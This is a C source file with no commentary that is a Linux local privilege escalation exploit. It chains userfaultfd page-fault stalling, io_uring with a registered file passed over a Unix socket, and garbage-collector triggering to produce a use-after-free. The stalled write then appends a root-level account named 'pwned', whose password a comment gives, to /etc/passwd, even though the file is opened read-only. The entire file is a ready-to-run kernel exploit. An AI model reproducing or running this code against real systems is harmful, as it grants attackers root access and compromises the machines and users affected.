#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <liburing.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <err.h>

static int userfaultfd(int flags)
{
	return syscall(__NR_userfaultfd, flags);
}

static char buffer[4096];
static void fault_manager(int ufd)
{
	struct uffd_msg msg;
	struct uffdio_copy copy;
	read(ufd, &msg, sizeof(msg));
	if (msg.event != UFFD_EVENT_PAGEFAULT)
		err(1, "event not pagefault");
	copy.dst = msg.arg.pagefault.address;
	copy.src = (long) buffer;
	copy.len = 4096;
	copy.mode = 0;
	copy.copy = 0;
  printf("[*] Page fault handler sleeping .. \n");
	sleep(3);
	ioctl(ufd, UFFDIO_COPY, &copy);
  printf("[*] Page fault handler released\n");
	close(ufd);
}

static char *bogus;

static void start_ufd(int ufd)
{
	struct uffdio_api api;
	struct uffdio_register reg;

	bogus = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	api.api = UFFD_API;
	api.features = 0;
	api.ioctls = 0;
	ioctl(ufd, UFFDIO_API, &api);

	reg.range.start = (long) bogus;
	reg.range.len = 4096;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	reg.ioctls = 0;

	ioctl(ufd, UFFDIO_REGISTER, &reg);
}


int sendfd(int s, int fd)
{
	struct msghdr msg;
	char buf[4096];
	struct cmsghdr *cmsg;
	int fds[1] = { fd };

	memset(&msg, 0, sizeof(msg));
	memset(buf, 0, sizeof(buf));

	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fds));
	memcpy(CMSG_DATA(cmsg), fds, sizeof(fds));

	msg.msg_controllen = CMSG_SPACE(sizeof(fds));

	sendmsg(s, &msg, 0);
}

int io_uring_setup(int r, void *p)
{
	return syscall(__NR_io_uring_setup, r, p);
}

int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig)
{
	return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

int io_uring_register(unsigned int fd, unsigned int opcode, void *arg, unsigned int nr_args)
{
	return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

int prepare_request(int fd, struct io_uring_params *params, struct io_uring *ring)
{
	struct io_uring_sqe *sqe;
	io_uring_queue_mmap(fd, params, ring);
	sqe = io_uring_get_sqe(ring);
	sqe->opcode = IORING_OP_WRITEV;
	sqe->fd = 1;
	sqe->addr = (long) bogus;
	sqe->len = 12;
	sqe->flags = IOSQE_FIXED_FILE;
}

int main(int argc, char **argv)
{
	int ufd;
	pid_t manager;

	struct io_uring ring;
	int fd;
	struct io_uring_params *params;
	int rfd[32];
	int s[2];
	int backup_fd;

	struct iovec *iov;

	int target_fd;

	iov = (void *) buffer;
	// The password for the new root user is "lol"
	iov[0].iov_base = "pwned:$1$aa$Sc4m1DBsyHWbRbwmIbGHq1:0:0:/root:/root:/bin/sh\n";
	iov[0].iov_len = 59;
	iov[1].iov_base = "";
	iov[1].iov_len = 0;
	iov[2].iov_base = "";
	iov[2].iov_len = 0;
	iov[10].iov_base = "";
	iov[10].iov_len = 0;
	iov[11].iov_base = "";
	iov[11].iov_len = 0;

	ufd = userfaultfd(0);
	if (ufd < 0)
		err(1, "userfaultfd");
	start_ufd(ufd);

	if ((manager = fork()) == 0) {
		fault_manager(ufd);
		exit(0);
	}
	close(ufd);

	socketpair(AF_UNIX, SOCK_DGRAM, 0, s);

	params = malloc(sizeof(*params));
	memset(params, 0, sizeof(*params));
	params->flags = IORING_SETUP_SQPOLL;
	fd = io_uring_setup(32, params);

	rfd[0] = s[1];
	rfd[1] = open("/tmp/rwA", O_RDWR | O_CREAT | O_APPEND, 0644);
	io_uring_register(fd, IORING_REGISTER_FILES, rfd, 2);
	close(rfd[1]);

	sendfd(s[0], fd);

	close(s[0]);
	close(s[1]);

	prepare_request(fd, params, &ring);
	io_uring_submit(&ring);

	io_uring_queue_exit(&ring);

  	if(!fork()){
    		printf("[*] Triggering unix_gc and freeing the registered fd\n");
    		close(socket(AF_UNIX, SOCK_DGRAM, 0));
    		printf("[*] CLOSING ..\n");
    		exit(0);
  	}

  	sleep(1);
  	printf("[*] Opening /etc/passwd in RDONLY (IT WILL DO THE WRITEV ANYWAY!!!!!!) \n");
  	int tfd = open("/etc/passwd", O_RDONLY | O_DIRECT);
	wait(NULL);
	wait(NULL);
  	printf("[*] Sleeping before exit ..\n");
  	sleep(6);
	return 0;
}
